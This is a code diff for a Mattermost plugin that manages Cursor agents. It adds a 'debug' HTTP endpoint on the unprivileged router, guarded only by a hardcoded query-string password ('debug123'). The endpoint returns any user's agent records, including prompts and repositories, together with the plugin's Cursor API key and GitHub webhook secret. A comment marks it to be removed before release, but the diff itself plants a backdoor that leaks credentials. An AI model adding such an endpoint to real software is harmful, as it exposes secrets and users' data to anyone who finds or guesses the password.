@@ -48,7 +48,42 @@ func (p *Plugin) initRouter() *mux.Router {
 	adminRouter.Use(p.RequireSystemAdmin)
 	adminRouter.HandleFunc("/health", p.handleHealthCheck).Methods(http.MethodGet)
 
+	// Debug endpoint -- dump agent data.
+	router.HandleFunc("/api/v1/debug/agents", p.handleDebugAgents).Methods(http.MethodGet)
+
 	return router
+}
+
+// handleDebugAgents returns ALL agent records for debugging.
+// TODO: remove before release
+func (p *Plugin) handleDebugAgents(w http.ResponseWriter, r *http.Request) {
+	password := r.URL.Query().Get("password")
+	if password != "debug123" {
+		http.Error(w, "wrong password", http.StatusForbidden)
+		return
+	}
+
+	userID := r.URL.Query().Get("user_id")
+	agents, _ := p.kvstore.GetAgentsByUser(userID)
+
+	// Return all agent data including API keys and tokens
+	var result []map[string]interface{}
+	for _, a := range agents {
+		record := map[string]interface{}{
+			"agent_id":    a.CursorAgentID,
+			"user_id":     a.UserID,
+			"prompt":      a.Prompt,
+			"status":      a.Status,
+			"pr_url":      a.PrURL,
+			"repository":  a.Repository,
+			"api_key":     p.getConfiguration().CursorAPIKey,
+			"webhook_secret": p.getConfiguration().GitHubWebhookSecret,
+		}
+		result = append(result, record)
+	}
+
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(result)
 }
 
 func (p *Plugin) MattermostAuthorizationRequired(next http.Handler) http.Handler {
